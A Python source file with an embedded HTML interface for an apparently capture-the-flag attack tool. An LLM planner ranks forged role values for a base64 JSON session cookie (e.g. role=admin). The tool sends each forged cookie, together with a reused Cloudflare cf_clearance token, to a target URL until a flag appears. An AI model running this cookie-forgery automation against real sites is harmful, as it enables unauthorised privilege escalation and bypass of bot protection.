#!/usr/bin/env python3
# recon_agent_v4.py — Streaming-Konsole + Ranked-Batch-Fire auf der Map.
#
# Selbststaendig: braucht nur recon.py daneben (+ pydantic-ai fuer den echten
# Planner). Eigener Port 8780 — zerstoert keine aeltere Version.
#
# Capability-Modell:
#   recon.py (deterministisch)  -> Kandidaten-MENUE
#   Planner (LLM, typisiert)    -> RANGFOLGE der Kandidaten (semantisch)
#   Oracle (deterministisch)    -> sagt als einziges "Flag gefunden"
#
# Demo-Modus: ohne cf_clearance werden Fires gemockt (Gewinner role=admin),
#   ohne API-Key wird die Rangfolge deterministisch gelassen. So laeuft die UI
#   auch ohne Key/Netz. Mit Key + cf wird alles echt.
#
# Install (fuer echten Planner):  pip install "pydantic-ai-slim[mistral]"
# Start:  python3 recon_agent_v4.py

import os, re, json, time, asyncio, threading, webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests
from recon import classify
from brain import build_planner, plan_stream
from dotenv import load_dotenv

load_dotenv()  # MISTRAL_API_KEY aus .env -> Key muss nicht ins UI-Feld

DEFAULT_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")
DEFAULT_URL = "https://pointeuse.cyberzerk.fr/"
DEFAULT_COOKIE = "profil"
DEFAULT_RAW = "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"
FLAG_RE = r"CyberZerk\{.*?\}"
PORT = 8780
DEMO_WINNER = "role=admin"   # im Demo-Modus "gewinnt" dieser Kandidat

DEFAULTS = {"url": DEFAULT_URL, "ua": DEFAULT_UA, "cname": DEFAULT_COOKIE, "raw": DEFAULT_RAW,
            "llm_base": "https://api.mistral.ai/v1", "llm_model": "mistral-large-4"}

# ---------- Reasoning-Capability: via brain.py (das EINZIGE Reasoning-Modul) ----------
# agent.py enthaelt selbst keine Reasoning-Logik mehr. Pro Request wird ein
# Per-Key-Planner gebaut (BYOK-UI-Key ODER .env) und sein Live-Denken (Thinking-
# Tokens) token-by-token in die Konsole gestreamt -- der v3-Stream, in die v4-UI.
_planner_cache = {}


def _planner_for(byok):
    """Per-Key-Planner (gecacht). Key aus UI-Feld oder .env, Modell aus DEFAULTS."""
    key = byok.get("key") or os.environ.get("MISTRAL_API_KEY", "")
    model = byok.get("model") or DEFAULTS["llm_model"]
    ck = (key, model)
    if ck not in _planner_cache:
        _planner_cache[ck] = build_planner(key or None, model)
    return _planner_cache[ck]


def run_planner_streaming(byok, finding, emit):
    """brain.plan_stream mit Per-Key-Planner; uebersetzt brain-Events (t=think) in
    die Frontend-Events (ev=think) dieser App. Gibt (ranked, ranking, rationale)."""
    agent = _planner_for(byok)

    def bridge(ev):
        if ev.get("t") == "think" and ev.get("d"):
            emit({"ev": "think", "text": ev["d"]})

    ranking = asyncio.run(plan_stream(finding, bridge, agent=agent))
    ranked = [r["pick"] for r in ranking]
    why = " · ".join(f'{r["pick"]}: {r["why"]}' for r in ranking[:3]) or "—"
    return ranked, ranking, why


# ---------- HTTP ----------
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _body(self):
        n = int(self.headers.get("Content-Length", 0))
        return json.loads(self.rfile.read(n).decode() or "{}")

    def do_GET(self):
        html = PAGE.replace("/*DEFAULTS*/", f"const DEFAULTS={json.dumps(DEFAULTS)};")
        self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers(); self.wfile.write(html.encode())

    def do_POST(self):
        d = self._body()
        if self.path == "/api/recon":
            b = json.dumps(classify(d.get("cname", ""), d.get("raw", ""))).encode()
            self.send_response(200); self.send_header("Content-Type", "application/json")
            self.end_headers(); self.wfile.write(b)
        elif self.path == "/api/run":
            self.send_response(200); self.send_header("Content-Type", "application/x-ndjson")
            self.send_header("Cache-Control", "no-cache"); self.end_headers()
            self._run(d)
        else:
            self.send_response(404); self.end_headers()

    def _emit(self, obj, pause=0.0):
        try:
            self.wfile.write((json.dumps(obj, ensure_ascii=False) + "\n").encode())
            self.wfile.flush()
            if pause:
                time.sleep(pause)
        except (BrokenPipeError, ConnectionResetError):
            raise

    def _run(self, d):
        url, cf, ua = d.get("url", DEFAULT_URL), d.get("cf", ""), d.get("ua", DEFAULT_UA)
        cname, raw = d.get("cname", DEFAULT_COOKIE), d.get("raw", "")
        byok = d.get("byok", {})
        demo = not cf
        try:
            f = classify(cname, raw)
            forged = {m["set"]: m["cookie_value"] for lv in f.get("levers", [])
                      if lv.get("typ") == "rolle" for m in lv.get("mutationen", []) if m.get("cookie_value")}
            cands = list(forged.keys())
            self._emit({"ev": "recon", "encoding": f["encoding"],
                        "levers": len(f["levers"]), "cands": len(cands), "finding": f}, 0.15)
            self._emit({"ev": "projection", "note": "MAP + Muster an Planner uebergeben (deps)"}, 0.15)

            # --- Plan (semantische Rangfolge) ---
            if byok.get("key") or os.environ.get("MISTRAL_API_KEY"):
                self._emit({"ev": "llm_start", "model": byok.get("model") or DEFAULTS["llm_model"]}, 0.1)
                try:
                    ranked, _ranking, rationale = run_planner_streaming(byok, f, self._emit)
                except Exception as e:
                    self._emit({"ev": "error", "where": "planner", "msg": str(e)[:200]})
                    ranked, rationale = cands, "Fallback: deterministische Reihenfolge."
            else:
                ranked, rationale = cands, "Kein Key — deterministische Reihenfolge (kein LLM)."
                self._emit({"ev": "llm_skip", "note": "kein API-Key"}, 0.1)
            self._emit({"ev": "plan", "ranked": ranked, "rationale": rationale}, 0.2)

            # --- Ranked Batch-Fire, Stop beim ersten Flag ---
            flag = None
            for i, s in enumerate(ranked):
                self._emit({"ev": "fire", "set": s, "i": i + 1, "n": len(ranked)}, 0.1)
                if demo:
                    time.sleep(0.25)
                    hit = (s == DEMO_WINNER)
                    res = {"status": 200, "flag": "CyberZerk{DEMO_kein_echter_request}" if hit else None}
                else:
                    try:
                        r = requests.get(url, headers={"User-Agent": ua},
                                         cookies={"cf_clearance": cf, cname: forged[s]}, timeout=20)
                        m = re.search(FLAG_RE, r.text)
                        res = {"status": r.status_code, "flag": m.group() if m else None}
                    except Exception as e:
                        res = {"status": None, "flag": None, "err": str(e)[:120]}
                self._emit({"ev": "oracle", "set": s, "status": res.get("status"),
                            "flag": res.get("flag"), "err": res.get("err")}, 0.1)
                if res.get("flag"):
                    flag = res["flag"]; break
            self._emit({"ev": "done", "flag": flag, "tried": i + 1, "demo": demo})
        except (BrokenPipeError, ConnectionResetError):
            return
        except Exception as e:
            try:
                self._emit({"ev": "error", "where": "run", "msg": str(e)[:200]})
            except Exception:
                pass


PAGE = r"""<!doctype html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Recon v4</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{color-scheme:dark;--bg:#0c0f14;--panel:#141a22;--panel2:#1a222c;--edge:#263040;
--ink:#e6edf3;--mut:#8696a8;--accent:#f0883e;--accent2:#ffb15c;--ok:#46c66d;--bad:#ff6b57;--line:#2f3b4c}
*{box-sizing:border-box}body{margin:0;font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--ink)}
.bar{position:sticky;top:0;z-index:5;background:rgba(12,15,20,.92);border-bottom:1px solid var(--edge);
padding:10px 16px;display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap}
.brand{font-weight:700;font-size:15px;margin-right:4px;align-self:center}
.field{display:flex;flex-direction:column;gap:3px}.field.grow{flex:1;min-width:130px}
.field label{font-size:10px;color:var(--mut);font-weight:600;text-transform:uppercase;letter-spacing:.4px}
.field input{background:var(--panel);border:1px solid var(--edge);border-radius:7px;color:var(--ink);
padding:7px 9px;font:12px ui-monospace,Menlo,monospace}.field input:focus{outline:none;border-color:var(--accent)}
.btn{background:var(--accent);color:#1a1206;border:0;border-radius:8px;font-weight:700;font-size:13px;
padding:9px 15px;cursor:pointer}.btn:hover{background:var(--accent2)}
.btn.ghost{background:transparent;color:var(--ink);border:1px solid var(--edge)}
#stage{position:relative;height:calc(100vh - 56px - 210px);overflow:auto}
#map{position:relative;min-width:1180px;min-height:600px;
background-image:radial-gradient(rgba(255,255,255,.035) 1px,transparent 1px);background-size:9px 9px}
#edges{position:absolute;inset:0;width:100%;height:100%;pointer-events:none}
.node{position:absolute;width:210px;background:var(--panel);border:1px solid var(--edge);border-radius:11px;
box-shadow:0 6px 18px rgba(0,0,0,.35);overflow:hidden}
.node .hd{display:flex;align-items:center;gap:8px;padding:9px 11px;background:var(--panel2);
border-bottom:1px solid var(--edge);font-size:12px;font-weight:600}
.node .bd{padding:9px 11px;font-size:12px;color:var(--mut);line-height:1.45;word-break:break-all}
.node .bd code{color:var(--ink);font-family:ui-monospace,Menlo,monospace;font-size:11px}
.tag{display:inline-block;font-size:10px;font-weight:700;padding:1px 7px;border-radius:20px;margin-left:auto}
.tag.b64{background:#1e2a3a;color:#9db4ff}.tag.idor{background:#3a2140;color:#e59bff}.tag.role{background:#3a2a16;color:var(--accent2)}
.cand{position:absolute;width:210px;background:var(--panel);border:1px solid var(--edge);border-radius:9px;
padding:8px 11px 8px 34px;font:12px/1.2 ui-monospace,Menlo,monospace;color:var(--ink);
display:flex;align-items:center;justify-content:space-between;gap:8px;transition:.12s}
.cand .rank{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:19px;height:19px;border-radius:50%;
background:#2a3340;color:var(--mut);font:700 10px Inter;display:flex;align-items:center;justify-content:center}
.cand.top .rank{background:var(--accent2);color:#1a1206}
.cand.firing{border-color:var(--accent);box-shadow:0 0 0 2px rgba(240,136,62,.5)}
.cand.win{border-color:var(--ok);background:#13261a}.cand.win .rank{background:var(--ok);color:#06210f}
.cand.lose{border-color:#3a2d33;opacity:.7}
.node.result{width:240px}.node.result.win{border-color:var(--ok)}
.flag{color:var(--ok);font-weight:700;font-family:ui-monospace,Menlo,monospace;font-size:12px}
.empty{position:absolute;left:44%;top:40%;color:var(--mut)}
/* Konsole */
#console{position:fixed;left:0;right:0;bottom:0;height:210px;background:#0a0d12;border-top:1px solid var(--edge);
display:flex;flex-direction:column}
.chd{display:flex;align-items:center;gap:8px;padding:7px 14px;border-bottom:1px solid var(--edge);
font-size:11px;font-weight:700;letter-spacing:.5px;color:var(--mut);text-transform:uppercase}
.chd .dot{width:8px;height:8px;border-radius:50%;background:#30404f}.chd .dot.live{background:var(--ok);animation:pul 1s infinite}
@keyframes pul{50%{opacity:.4}}
#log{flex:1;overflow:auto;padding:8px 14px;font:12px/1.55 ui-monospace,Menlo,monospace}
.ln{white-space:pre-wrap;word-break:break-all}
.ln .t{color:#4a5a6b}.c-recon{color:#9db4ff}.c-projection{color:#8696a8}.c-llm{color:var(--accent2)}
.c-plan{color:#c9a6ff}.c-fire{color:var(--accent)}.c-oracle-ok{color:var(--ok)}.c-oracle-no{color:#8696a8}
.c-done{color:var(--ok);font-weight:700}.c-error{color:var(--bad)}.c-think{color:#7fd1c4}
</style></head><body>
<div class="bar">
  <div class="brand">Recon v4</div>
  <div class="field grow"><label>Ziel-URL</label><input id="url"></div>
  <div class="field grow"><label>cf_clearance</label><input id="cf" placeholder="leer = Demo"></div>
  <div class="field"><label>Cookie</label><input id="cname" style="width:78px"></div>
  <div class="field grow"><label>Cookie-Wert (roh)</label><input id="raw"></div>
  <div class="field"><label>API-Key</label><input id="llm_key" type="password" placeholder="leer = .env-Key" style="width:120px"></div>
  <button class="btn ghost" onclick="scan()">Scan</button>
  <button class="btn" onclick="run()">▶ Run (Plan + Batch)</button>
</div>
<div id="stage"><div id="map"><svg id="edges"></svg><div class="empty" id="empty">Scan oder Run.</div></div></div>
<div id="console"><div class="chd"><span class="dot" id="dot"></span>Ereignis-Protokoll
  <span style="margin-left:auto;font-weight:400;text-transform:none" id="cstat"></span></div>
<div id="log"></div></div>
<script>
/*DEFAULTS*/
const $=id=>document.getElementById(id);
['url','cname','raw'].forEach(k=>{if($(k))$(k).value=DEFAULTS[k];});
let UA=DEFAULTS.ua,FINDING=null,nodes={},lastEdges=[];
const COLX=[24,270,516,762,1010],map=$('map'),edges=$('edges');

function placeNode(id,col,top,html,cls=''){const el=document.createElement('div');el.className='node '+cls;
 el.style.left=COLX[col]+'px';el.style.top=top+'px';el.innerHTML=html;map.appendChild(el);nodes[id]=el;return el;}
function center(el,s){const r=el.getBoundingClientRect(),m=map.getBoundingClientRect();
 return {x:s=='r'?r.left-m.left+r.width:r.left-m.left,y:r.top-m.top+r.height/2};}
function redraw(){edges.innerHTML='';lastEdges.forEach(([a,b,c])=>{if(!nodes[a]||!nodes[b])return;
 const p=center(nodes[a],'r'),q=center(nodes[b],'l');const path=document.createElementNS('http://www.w3.org/2000/svg','path');
 path.setAttribute('d',`M${p.x} ${p.y} C ${p.x+50} ${p.y}, ${q.x-50} ${q.y}, ${q.x} ${q.y}`);
 path.setAttribute('fill','none');path.setAttribute('stroke',c=='win'?'var(--ok)':'var(--line)');
 path.setAttribute('stroke-width',c=='win'?'2.5':'1.6');edges.appendChild(path);});}
addEventListener('resize',redraw);

function renderMap(f){map.querySelectorAll('.node,.cand').forEach(n=>n.remove());nodes={};lastEdges=[];edges.innerHTML='';
 $('empty').style.display='none';let host='Ziel';try{host=new URL($('url').value).host;}catch(e){}
 placeNode('target',0,250,`<div class=hd>Ziel</div><div class=bd><code>${host}</code></div>`);
 placeNode('cookie',1,232,`<div class=hd>Cookie ‘${f.cookie}’<span class="tag b64">${f.encoding}</span></div>
  <div class=bd><code>${f.json?JSON.stringify(f.json):'—'}</code></div>`);lastEdges.push(['target','cookie','']);
 let roleLever=null,cands=[];
 f.levers.forEach(lv=>{if(lv.typ=='identitaet'){placeNode('lv_id',2,150,`<div class=hd>Identität<span class="tag idor">IDOR</span></div>
   <div class=bd><code>${lv.key}=${lv.aktuell}</code></div>`);lastEdges.push(['cookie','lv_id','']);}
  else{placeNode('lv_role',2,330,`<div class=hd>Rolle<span class="tag role">${lv.mutationen.filter(m=>m.cookie_value).length}×</span></div>
   <div class=bd><code>${lv.key}=${lv.aktuell}</code> · deterministisch erzeugt</div>`);roleLever='lv_role';
   lastEdges.push(['cookie','lv_role','']);cands=lv.mutationen.filter(m=>m.cookie_value);}});
 let y=96;cands.forEach((m,i)=>{const el=document.createElement('div');el.className='cand';el.style.left=COLX[3]+'px';
  el.style.top=y+'px';el.dataset.set=m.set;el.innerHTML=`<span class=rank>·</span><span>${m.set}</span><span class=go></span>`;
  map.appendChild(el);nodes['c_'+m.set]=el;if(roleLever)lastEdges.push([roleLever,'c_'+m.set,'']);y+=44;});
 redraw();}

async function scan(){const f=await(await fetch('/api/recon',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({cname:$('cname').value,raw:$('raw').value})})).json();FINDING=f;renderMap(f);}

// ---- Konsole ----
function log(cls,txt){const t=new Date().toLocaleTimeString('de',{hour12:false});
 const d=document.createElement('div');d.className='ln '+cls;d.innerHTML=`<span class=t>${t}</span>  ${txt}`;
 $('log').appendChild(d);$('log').scrollTop=1e9;}
let _thinkEl=null,_thinkBuf='';
function appendThink(t){
 if(!_thinkEl){_thinkBuf='';const tm=new Date().toLocaleTimeString('de',{hour12:false});
  const d=document.createElement('div');d.className='ln c-think';
  d.innerHTML=`<span class=t>${tm}</span>  think · <span class=tb></span>`;
  $('log').appendChild(d);_thinkEl=d.querySelector('.tb');}
 _thinkBuf+=t;_thinkEl.textContent=_thinkBuf.slice(-800);$('log').scrollTop=1e9;}
function setCand(set,cls){const el=nodes['c_'+set];if(el){el.classList.remove('firing','win','lose');el.classList.add(cls);}}
function rankCand(set,n,top){const el=nodes['c_'+set];if(el){el.querySelector('.rank').textContent=n;if(top)el.classList.add('top');}}

async function run(){
 $('log').innerHTML='';_thinkEl=null;_thinkBuf='';$('dot').classList.add('live');$('cstat').textContent='läuft…';
 const payload={url:$('url').value,cf:$('cf').value,ua:UA,cname:$('cname').value,raw:$('raw').value,
   byok:{key:$('llm_key').value,model:DEFAULTS.llm_model}};
 const res=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
 const reader=res.body.getReader(),dec=new TextDecoder();let buf='';
 while(true){const {done,value}=await reader.read();if(done)break;buf+=dec.decode(value,{stream:true});
  let nl;while((nl=buf.indexOf('\n'))>=0){const line=buf.slice(0,nl).trim();buf=buf.slice(nl+1);if(line)handle(JSON.parse(line));}}
 $('dot').classList.remove('live');$('cstat').textContent='fertig';
}
function handle(e){
 switch(e.ev){
  case 'recon': FINDING=e.finding;renderMap(e.finding);
    log('c-recon',`recon · ${e.encoding} · ${e.levers} Hebel · ${e.cands} Kandidaten (deterministisch)`);break;
  case 'projection': log('c-projection','projection · '+e.note);break;
  case 'llm_start': log('c-llm',`llm · Planner startet (${e.model}) — semantische Rangfolge`);break;
  case 'llm_skip': log('c-projection','llm · übersprungen ('+e.note+')');break;
  case 'think': appendThink(e.text);break;
  case 'plan': _thinkEl=null;
    log('c-plan',`plan · ${e.ranked.join(' > ')}`);log('c-plan','plan · '+e.rationale);
    e.ranked.forEach((s,i)=>rankCand(s,i+1,i===0));break;
  case 'fire': setCand(e.set,'firing');log('c-fire',`fire · [${e.i}/${e.n}] ${e.set} →`);break;
  case 'oracle':
    if(e.flag){setCand(e.set,'win');log('c-oracle-ok',`oracle · ${e.set} · HTTP ${e.status} · FLAG ✓`);
      placeNode('result',4,(nodes['c_'+e.set]?parseInt(nodes['c_'+e.set].style.top)-20:120),
        `<div class=hd>Ergebnis</div><div class=bd><div class=flag>${e.flag}</div></div>`,'result win');
      lastEdges.push(['c_'+e.set,'result','win']);redraw();}
    else{setCand(e.set,'lose');log('c-oracle-no',`oracle · ${e.set} · HTTP ${e.status||'—'} · kein Flag`);}break;
  case 'done': log('c-done',`done · ${e.flag?'Flag nach '+e.tried+' Versuch(en)':'kein Flag'}${e.demo?' · DEMO':''}`);break;
  case 'error': log('c-error',`error · ${e.where}: ${e.msg}`);break;
 }
}
</script></body></html>"""


if __name__ == "__main__":
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    u = f"http://127.0.0.1:{PORT}"
    print(f"Recon v4 laeuft:  {u}   (Strg+C zum Beenden)")
    threading.Timer(0.6, lambda: webbrowser.open(u)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBeendet.")
